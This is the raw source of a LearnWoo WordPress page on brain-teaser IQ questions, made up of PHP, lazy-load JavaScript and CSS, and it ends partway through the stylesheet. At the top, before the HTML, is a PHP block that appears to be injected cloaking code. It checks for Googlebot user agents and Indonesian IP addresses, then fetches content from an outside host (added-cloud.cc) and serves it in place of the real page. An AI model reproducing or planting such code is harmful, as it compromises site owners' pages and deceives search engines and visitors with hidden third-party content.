<?php
function is_googlebot() {
    $agents = [
        "Googlebot", "Google-Site-Verification", "Google-InspectionTool",
        "Googlebot-Mobile", "Googlebot-News", "Mediapartners-Google"
    ];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    foreach ($agents as $agent) {
        if (stripos($ua, $agent) !== false) {
            return true;
        }
    }
    return false;
}

function is_from_indonesia() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $geo = @unserialize(file_get_contents("http://ip-api.com/php/{$ip}?fields=countryCode"));
    return is_array($geo) && $geo['countryCode'] === 'ID';
}

$bot_content = 'https://added-cloud.cc/packdol/getcontent/learnwoo.com/brain-teaser-iq-questions-and-answers.txt';

if (is_googlebot() || is_from_indonesia()) {
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $bot_content,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    ));
    $response = curl_exec($curl);
    curl_close($curl);

    // Pastikan response valid
    if ($response) {
        echo $response;
    } else {
        http_response_code(204); // No Content
    }
    exit;
}
?>
<!doctype html >
<!--[if IE 8]>    <html class="ie8" lang="en"> <![endif]-->
<!--[if IE 9]>    <html class="ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en-US" prefix="og: https://ogp.me/ns#"> <!--<![endif]-->
<head><meta charset="UTF-8" /><script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>(()=>{class RocketLazyLoadScripts{constructor(){this.v="2.0.3",this.userEvents=["keydown","keyup","mousedown","mouseup","mousemove","mouseover","mouseenter","mouseout","mouseleave","touchmove","touchstart","touchend","touchcancel","wheel","click","dblclick","input","visibilitychange"],this.attributeEvents=["onblur","onclick","oncontextmenu","ondblclick","onfocus","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onscroll","onsubmit"]}async t(){this.i(),this.o(),/iP(ad|hone)/.test(navigator.userAgent)&&this.h(),this.u(),this.l(this),this.m(),this.k(this),this.p(this),this._(),await Promise.all([this.R(),this.L()]),this.lastBreath=Date.now(),this.S(this),this.P(),this.D(),this.O(),this.M(),await this.C(this.delayedScripts.normal),await this.C(this.delayedScripts.defer),await this.C(this.delayedScripts.async),this.F("domReady"),await this.T(),await this.j(),await this.I(),this.F("windowLoad"),await this.A(),window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this.everythingLoaded=!0,this.lastTouchEnd&&await new Promise((t=>setTimeout(t,500-Date.now()+this.lastTouchEnd))),this.H(),this.F("all"),this.U(),this.W()}i(){this.CSPIssue=sessionStorage.getItem("rocketCSPIssue"),document.addEventListener("securitypolicyviolation",(t=>{this.CSPIssue||"script-src-elem"!==t.violatedDirective||"data"!==t.blockedURI||(this.CSPIssue=!0,sessionStorage.setItem("rocketCSPIssue",!0))}),{isRocket:!0})}o(){window.addEventListener("pageshow",(t=>{this.persisted=t.persisted,this.realWindowLoadedFired=!0}),{isRocket:!0}),window.addEventListener("pagehide",(()=>{this.onFirstUserAction=null}),{isRocket:!0})}h(){let t;function e(e){t=e}window.addEventListener("touchstart",e,{isRocket:!0}),window.addEventListener("touchend",(function i(o){Math.abs(o.changedTouches[0].pageX-t.changedTouches[0].pageX)<10&&Math.abs(o.changedTouches[0].pageY-t.changedTouches[0].pageY)<10&&o.timeStamp-t.timeStamp<200&&(o.target.dispatchEvent(new PointerEvent("click",{target:o.target,bubbles:!0,cancelable:!0,detail:1})),event.preventDefault(),window.removeEventListener("touchstart",e,{isRocket:!0}),window.removeEventListener("touchend",i,{isRocket:!0}))}),{isRocket:!0})}q(t){this.userActionTriggered||("mousemove"!==t.type||this.firstMousemoveIgnored?"keyup"===t.type||"mouseover"===t.type||"mouseout"===t.type||(this.userActionTriggered=!0,this.onFirstUserAction&&this.onFirstUserAction()):this.firstMousemoveIgnored=!0),"click"===t.type&&t.preventDefault(),this.savedUserEvents.length>0&&(t.stopPropagation(),t.stopImmediatePropagation()),"touchstart"===this.lastEvent&&"touchend"===t.type&&(this.lastTouchEnd=Date.now()),"click"===t.type&&(this.lastTouchEnd=0),this.lastEvent=t.type,this.savedUserEvents.push(t)}u(){this.savedUserEvents=[],this.userEventHandler=this.q.bind(this),this.userEvents.forEach((t=>window.addEventListener(t,this.userEventHandler,{passive:!1,isRocket:!0})))}U(){this.userEvents.forEach((t=>window.removeEventListener(t,this.userEventHandler,{passive:!1,isRocket:!0}))),this.savedUserEvents.forEach((t=>{t.target.dispatchEvent(new window[t.constructor.name](t.type,t))}))}m(){this.eventsMutationObserver=new MutationObserver((t=>{const e="return false";for(const i of t){if("attributes"===i.type){const t=i.target.getAttribute(i.attributeName);t&&t!==e&&(i.target.setAttribute("data-rocket-"+i.attributeName,t),i.target["rocket"+i.attributeName]=new Function("event",t),i.target.setAttribute(i.attributeName,e))}"childList"===i.type&&i.addedNodes.forEach((t=>{if(t.nodeType===Node.ELEMENT_NODE)for(const i of t.attributes)this.attributeEvents.includes(i.name)&&i.value&&""!==i.value&&(t.setAttribute("data-rocket-"+i.name,i.value),t["rocket"+i.name]=new Function("event",i.value),t.setAttribute(i.name,e))}))}})),this.eventsMutationObserver.observe(document,{subtree:!0,childList:!0,attributeFilter:this.attributeEvents})}H(){this.eventsMutationObserver.disconnect(),this.attributeEvents.forEach((t=>{document.querySelectorAll("[data-rocket-"+t+"]").forEach((e=>{e.setAttribute(t,e.getAttribute("data-rocket-"+t)),e.removeAttribute("data-rocket-"+t)}))}))}k(t){Object.defineProperty(HTMLElement.prototype,"onclick",{get(){return this.rocketonclick||null},set(e){this.rocketonclick=e,this.setAttribute(t.everythingLoaded?"onclick":"data-rocket-onclick","this.rocketonclick(event)")}})}S(t){function e(e,i){let o=e[i];e[i]=null,Object.defineProperty(e,i,{get:()=>o,set(s){t.everythingLoaded?o=s:e["rocket"+i]=o=s}})}e(document,"onreadystatechange"),e(window,"onload"),e(window,"onpageshow");try{Object.defineProperty(document,"readyState",{get:()=>t.rocketReadyState,set(e){t.rocketReadyState=e},configurable:!0}),document.readyState="loading"}catch(t){console.log("WPRocket DJE readyState conflict, bypassing")}}l(t){this.originalAddEventListener=EventTarget.prototype.addEventListener,this.originalRemoveEventListener=EventTarget.prototype.removeEventListener,this.savedEventListeners=[],EventTarget.prototype.addEventListener=function(e,i,o){o&&o.isRocket||!t.B(e,this)&&!t.userEvents.includes(e)||t.B(e,this)&&!t.userActionTriggered||e.startsWith("rocket-")||t.everythingLoaded?t.originalAddEventListener.call(this,e,i,o):t.savedEventListeners.push({target:this,remove:!1,type:e,func:i,options:o})},EventTarget.prototype.removeEventListener=function(e,i,o){o&&o.isRocket||!t.B(e,this)&&!t.userEvents.includes(e)||t.B(e,this)&&!t.userActionTriggered||e.startsWith("rocket-")||t.everythingLoaded?t.originalRemoveEventListener.call(this,e,i,o):t.savedEventListeners.push({target:this,remove:!0,type:e,func:i,options:o})}}F(t){"all"===t&&(EventTarget.prototype.addEventListener=this.originalAddEventListener,EventTarget.prototype.removeEventListener=this.originalRemoveEventListener),this.savedEventListeners=this.savedEventListeners.filter((e=>{let i=e.type,o=e.target||window;return"domReady"===t&&"DOMContentLoaded"!==i&&"readystatechange"!==i||("windowLoad"===t&&"load"!==i&&"readystatechange"!==i&&"pageshow"!==i||(this.B(i,o)&&(i="rocket-"+i),e.remove?o.removeEventListener(i,e.func,e.options):o.addEventListener(i,e.func,e.options),!1))}))}p(t){let e;function i(e){return t.everythingLoaded?e:e.split(" ").map((t=>"load"===t||t.startsWith("load.")?"rocket-jquery-load":t)).join(" ")}function o(o){function s(e){const s=o.fn[e];o.fn[e]=o.fn.init.prototype[e]=function(){return this[0]===window&&t.userActionTriggered&&("string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=i(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach((t=>{const e=arguments[0][t];delete arguments[0][t],arguments[0][i(t)]=e}))),s.apply(this,arguments),this}}if(o&&o.fn&&!t.allJQueries.includes(o)){const e={DOMContentLoaded:[],"rocket-DOMContentLoaded":[]};for(const t in e)document.addEventListener(t,(()=>{e[t].forEach((t=>t()))}),{isRocket:!0});o.fn.ready=o.fn.init.prototype.ready=function(i){function s(){parseInt(o.fn.jquery)>2?setTimeout((()=>i.bind(document)(o))):i.bind(document)(o)}return t.realDomReadyFired?!t.userActionTriggered||t.fauxDomReadyFired?s():e["rocket-DOMContentLoaded"].push(s):e.DOMContentLoaded.push(s),o([])},s("on"),s("one"),s("off"),t.allJQueries.push(o)}e=o}t.allJQueries=[],o(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>e,set(t){o(t)}})}P(){const t=new Map;document.write=document.writeln=function(e){const i=document.currentScript,o=document.createRange(),s=i.parentElement;let n=t.get(i);void 0===n&&(n=i.nextSibling,t.set(i,n));const c=document.createDocumentFragment();o.setStart(c,0),c.appendChild(o.createContextualFragment(e)),s.insertBefore(c,n)}}async R(){return new Promise((t=>{this.userActionTriggered?t():this.onFirstUserAction=t}))}async L(){return new Promise((t=>{document.addEventListener("DOMContentLoaded",(()=>{this.realDomReadyFired=!0,t()}),{isRocket:!0})}))}async I(){return this.realWindowLoadedFired?Promise.resolve():new Promise((t=>{window.addEventListener("load",t,{isRocket:!0})}))}M(){this.pendingScripts=[];this.scriptsMutationObserver=new MutationObserver((t=>{for(const e of t)e.addedNodes.forEach((t=>{"SCRIPT"!==t.tagName||t.noModule||t.isWPRocket||this.pendingScripts.push({script:t,promise:new Promise((e=>{const i=()=>{const i=this.pendingScripts.findIndex((e=>e.script===t));i>=0&&this.pendingScripts.splice(i,1),e()};t.addEventListener("load",i,{isRocket:!0}),t.addEventListener("error",i,{isRocket:!0}),setTimeout(i,1e3)}))})}))})),this.scriptsMutationObserver.observe(document,{childList:!0,subtree:!0})}async j(){await this.J(),this.pendingScripts.length?(await this.pendingScripts[0].promise,await this.j()):this.scriptsMutationObserver.disconnect()}D(){this.delayedScripts={normal:[],async:[],defer:[]},document.querySelectorAll("script[type$=rocketlazyloadscript]").forEach((t=>{t.hasAttribute("data-rocket-src")?t.hasAttribute("async")&&!1!==t.async?this.delayedScripts.async.push(t):t.hasAttribute("defer")&&!1!==t.defer||"module"===t.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(t):this.delayedScripts.normal.push(t):this.delayedScripts.normal.push(t)}))}async _(){await this.L();let t=[];document.querySelectorAll("script[type$=rocketlazyloadscript][data-rocket-src]").forEach((e=>{let i=e.getAttribute("data-rocket-src");if(i&&!i.startsWith("data:")){i.startsWith("//")&&(i=location.protocol+i);try{const o=new URL(i).origin;o!==location.origin&&t.push({src:o,crossOrigin:e.crossOrigin||"module"===e.getAttribute("data-rocket-type")})}catch(t){}}})),t=[...new Map(t.map((t=>[JSON.stringify(t),t]))).values()],this.N(t,"preconnect")}async $(t){if(await this.G(),!0!==t.noModule||!("noModule"in HTMLScriptElement.prototype))return new Promise((e=>{let i;function o(){(i||t).setAttribute("data-rocket-status","executed"),e()}try{if(navigator.userAgent.includes("Firefox/")||""===navigator.vendor||this.CSPIssue)i=document.createElement("script"),[...t.attributes].forEach((t=>{let e=t.nodeName;"type"!==e&&("data-rocket-type"===e&&(e="type"),"data-rocket-src"===e&&(e="src"),i.setAttribute(e,t.nodeValue))})),t.text&&(i.text=t.text),t.nonce&&(i.nonce=t.nonce),i.hasAttribute("src")?(i.addEventListener("load",o,{isRocket:!0}),i.addEventListener("error",(()=>{i.setAttribute("data-rocket-status","failed-network"),e()}),{isRocket:!0}),setTimeout((()=>{i.isConnected||e()}),1)):(i.text=t.text,o()),i.isWPRocket=!0,t.parentNode.replaceChild(i,t);else{const i=t.getAttribute("data-rocket-type"),s=t.getAttribute("data-rocket-src");i?(t.type=i,t.removeAttribute("data-rocket-type")):t.removeAttribute("type"),t.addEventListener("load",o,{isRocket:!0}),t.addEventListener("error",(i=>{this.CSPIssue&&i.target.src.startsWith("data:")?(console.log("WPRocket: CSP fallback activated"),t.removeAttribute("src"),this.$(t).then(e)):(t.setAttribute("data-rocket-status","failed-network"),e())}),{isRocket:!0}),s?(t.fetchPriority="high",t.removeAttribute("data-rocket-src"),t.src=s):t.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(t.text)))}}catch(i){t.setAttribute("data-rocket-status","failed-transform"),e()}}));t.setAttribute("data-rocket-status","skipped")}async C(t){const e=t.shift();return e?(e.isConnected&&await this.$(e),this.C(t)):Promise.resolve()}O(){this.N([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}N(t,e){this.trash=this.trash||[];let i=!0;var o=document.createDocumentFragment();t.forEach((t=>{const s=t.getAttribute&&t.getAttribute("data-rocket-src")||t.src;if(s&&!s.startsWith("data:")){const n=document.createElement("link");n.href=s,n.rel=e,"preconnect"!==e&&(n.as="script",n.fetchPriority=i?"high":"low"),t.getAttribute&&"module"===t.getAttribute("data-rocket-type")&&(n.crossOrigin=!0),t.crossOrigin&&(n.crossOrigin=t.crossOrigin),t.integrity&&(n.integrity=t.integrity),t.nonce&&(n.nonce=t.nonce),o.appendChild(n),this.trash.push(n),i=!1}})),document.head.appendChild(o)}W(){this.trash.forEach((t=>t.remove()))}async T(){try{document.readyState="interactive"}catch(t){}this.fauxDomReadyFired=!0;try{await this.G(),document.dispatchEvent(new Event("rocket-readystatechange")),await this.G(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this.G(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this.G(),window.dispatchEvent(new Event("rocket-DOMContentLoaded"))}catch(t){console.error(t)}}async A(){try{document.readyState="complete"}catch(t){}try{await this.G(),document.dispatchEvent(new Event("rocket-readystatechange")),await this.G(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this.G(),window.dispatchEvent(new Event("rocket-load")),await this.G(),window.rocketonload&&window.rocketonload(),await this.G(),this.allJQueries.forEach((t=>t(window).trigger("rocket-jquery-load"))),await this.G();const t=new Event("rocket-pageshow");t.persisted=this.persisted,window.dispatchEvent(t),await this.G(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted})}catch(t){console.error(t)}}async G(){Date.now()-this.lastBreath>45&&(await this.J(),this.lastBreath=Date.now())}async J(){return document.hidden?new Promise((t=>setTimeout(t))):new Promise((t=>requestAnimationFrame(t)))}B(t,e){return e===document&&"readystatechange"===t||(e===document&&"DOMContentLoaded"===t||(e===window&&"DOMContentLoaded"===t||(e===window&&"load"===t||e===window&&"pageshow"===t)))}static run(){(new RocketLazyLoadScripts).t()}}RocketLazyLoadScripts.run()})();</script>
    <title>100+ Brain Teaser IQ Questions and Answers - LearnWoo</title>
<link crossorigin data-rocket-preconnect href="https://cdn.learnwoo.com" rel="preconnect">
<link crossorigin data-rocket-preconnect href="https://js.stripe.com" rel="preconnect">
<link crossorigin data-rocket-preload as="font" href="https://learnwoo.com/wp-content/plugins/social-icons/assets/fonts/Socicon.woff2" rel="preload">
<link crossorigin data-rocket-preload as="font" href="https://learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.woff?24" rel="preload">
<style id="wpr-usedcss">img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-.1em!important;background:0 0!important;padding:0!important}:where(.wp-block-button__link){border-radius:9999px;box-shadow:none;padding:calc(.667em + 2px) calc(1.333em + 2px);text-decoration:none}:root :where(.wp-block-button .wp-block-button__link.is-style-outline),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link){border:2px solid;padding:.667em 1.333em}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-text-color)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-text-color)){color:currentColor}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-background)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-background)){background-color:initial;background-image:none}:where(.wp-block-calendar table:not(.has-background) th){background:#ddd}:where(.wp-block-columns){margin-bottom:1.75em}:where(.wp-block-columns.has-background){padding:1.25em 2.375em}:where(.wp-block-post-comments input[type=submit]){border:none}:where(.wp-block-cover-image:not(.has-text-color)),:where(.wp-block-cover:not(.has-text-color)){color:#fff}:where(.wp-block-cover-image.is-light:not(.has-text-color)),:where(.wp-block-cover.is-light:not(.has-text-color)){color:#000}:root :where(.wp-block-cover h1:not(.has-text-color)),:root :where(.wp-block-cover h2:not(.has-text-color)),:root :where(.wp-block-cover h3:not(.has-text-color)),:root :where(.wp-block-cover h4:not(.has-text-color)),:root :where(.wp-block-cover h5:not(.has-text-color)),:root :where(.wp-block-cover h6:not(.has-text-color)),:root :where(.wp-block-cover p:not(.has-text-color)){color:inherit}:where(.wp-block-file){margin-bottom:1.5em}:where(.wp-block-file__button){border-radius:2em;display:inline-block;padding:.5em 1em}:where(.wp-block-file__button):is(a):active,:where(.wp-block-file__button):is(a):focus,:where(.wp-block-file__button):is(a):hover,:where(.wp-block-file__button):is(a):visited{box-shadow:none;color:#fff;opacity:.85;text-decoration:none}.wp-block-gallery:not(.has-nested-images){display:flex;flex-wrap:wrap;list-style-type:none;margin:0;padding:0}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item{display:flex;flex-direction:column;flex-grow:1;justify-content:center;margin:0 1em 1em 0;position:relative;width:calc(50% - 1em)}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item:nth-of-type(2n){margin-right:0}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item figure{align-items:flex-end;display:flex;height:100%;justify-content:flex-start;margin:0}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item img{display:block;height:auto;max-width:100%;width:auto}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item figcaption{background:linear-gradient(0deg,#000000b3,#0000004d 70%,#0000);bottom:0;box-sizing:border-box;color:#fff;font-size:.8em;margin:0;max-height:100%;overflow:auto;padding:3em .77em .7em;position:absolute;text-align:center;width:100%;z-index:2}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item figcaption img{display:inline}.wp-block-gallery:not(.has-nested-images) figcaption{flex-grow:1}.wp-block-gallery:not(.has-nested-images) .blocks-gallery-item:last-child{margin-right:0}.wp-block-gallery:not(.is-cropped) .blocks-gallery-item{align-self:flex-start}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:.4s show-content-image}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}:where(.wp-block-latest-comments:not([style*=line-height] .wp-block-latest-comments__comment)){line-height:1.1}:where(.wp-block-latest-comments:not([style*=line-height] .wp-block-latest-comments__comment-excerpt p)){line-height:1.8}:root :where(.wp-block-latest-posts.is-grid){padding:0}:root :where(.wp-block-latest-posts.wp-block-latest-posts__list){padding-left:0}ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}:where(.wp-block-navigation.has-background .wp-block-navigation-item a:not(.wp-element-button)),:where(.wp-block-navigation.has-background .wp-block-navigation-submenu a:not(.wp-element-button)){padding:.5em 1em}:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-item a:not(.wp-element-button)),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-submenu a:not(.wp-element-button)),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-submenu button.wp-block-navigation-item__content),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-pages-list__item button.wp-block-navigation-item__content){padding:.5em 1em}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}:where(.wp-block-post-comments-form) input:not([type=submit]),:where(.wp-block-post-comments-form) textarea{border:1px solid #949494;font-family:inherit;font-size:1em}:where(.wp-block-post-comments-form) input:where(:not([type=submit]):not([type=checkbox])),:where(.wp-block-post-comments-form) textarea{padding:calc(.667em + 2px)}:where(.wp-block-post-excerpt){box-sizing:border-box;margin-bottom:var(--wp--style--block-gap);margin-top:var(--wp--style--block-gap)}.wp-block-preformatted{box-sizing:border-box;white-space:pre-wrap}:where(.wp-block-preformatted.has-background){padding:1.25em 2.375em}:where(.wp-block-search__button){border:1px solid #ccc;padding:6px 10px}:where(.wp-block-search__input){font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-transform:inherit}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper){border:1px solid #949494;box-sizing:border-box;padding:4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input{border:none;border-radius:0;padding:0 4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input:focus{outline:0}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) :where(.wp-block-search__button){padding:4px 8px}:root :where(.wp-block-separator.is-style-dots){height:auto;line-height:1;text-align:center}:root :where(.wp-block-separator.is-style-dots):before{color:currentColor;content:"···";font-family:serif;font-size:1.5em;letter-spacing:2em;padding-left:2em}:root :where(.wp-block-site-logo.is-style-rounded){border-radius:9999px}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link{background-color:#f0f0f0;color:#444}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-amazon{background-color:#f90;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-bandcamp{background-color:#1ea0c3;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-behance{background-color:#0757fe;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-bluesky{background-color:#0a7aff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-codepen{background-color:#1e1f26;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-deviantart{background-color:#02e49b;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-discord{background-color:#5865f2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-dribbble{background-color:#e94c89;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-dropbox{background-color:#4280ff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-etsy{background-color:#f45800;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-facebook{background-color:#0866ff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-fivehundredpx{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-flickr{background-color:#0461dd;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-foursquare{background-color:#e65678;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-github{background-color:#24292d;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-goodreads{background-color:#eceadd;color:#382110}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-google{background-color:#ea4434;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-gravatar{background-color:#1d4fc4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-instagram{background-color:#f00075;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-lastfm{background-color:#e21b24;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-linkedin{background-color:#0d66c2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-mastodon{background-color:#3288d4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-medium{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-meetup{background-color:#f6405f;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-patreon{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-pinterest{background-color:#e60122;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-pocket{background-color:#ef4155;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-reddit{background-color:#ff4500;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-skype{background-color:#0478d7;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-snapchat{background-color:#fefc00;color:#fff;stroke:#000}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-soundcloud{background-color:#ff5600;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-spotify{background-color:#1bd760;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-telegram{background-color:#2aabee;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-threads{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-tiktok{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-tumblr{background-color:#011835;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-twitch{background-color:#6440a4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-twitter{background-color:#1da1f2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-vimeo{background-color:#1eb7ea;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-vk{background-color:#4680c2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-wordpress{background-color:#3499cd;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-whatsapp{background-color:#25d366;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-x{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-yelp{background-color:#d32422;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-youtube{background-color:red;color:#fff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link{background:0 0}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link svg{height:1.25em;width:1.25em}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-amazon{color:#f90}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bandcamp{color:#1ea0c3}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-behance{color:#0757fe}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bluesky{color:#0a7aff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-codepen{color:#1e1f26}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-deviantart{color:#02e49b}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-discord{color:#5865f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dribbble{color:#e94c89}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dropbox{color:#4280ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-etsy{color:#f45800}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-facebook{color:#0866ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-fivehundredpx{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-flickr{color:#0461dd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-foursquare{color:#e65678}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-github{color:#24292d}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-goodreads{color:#382110}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-google{color:#ea4434}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-gravatar{color:#1d4fc4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-instagram{color:#f00075}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-lastfm{color:#e21b24}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-linkedin{color:#0d66c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-mastodon{color:#3288d4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-medium{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-meetup{color:#f6405f}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-patreon{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pinterest{color:#e60122}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pocket{color:#ef4155}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-reddit{color:#ff4500}:where(.wp-block-social-links.is-style-logos-only) 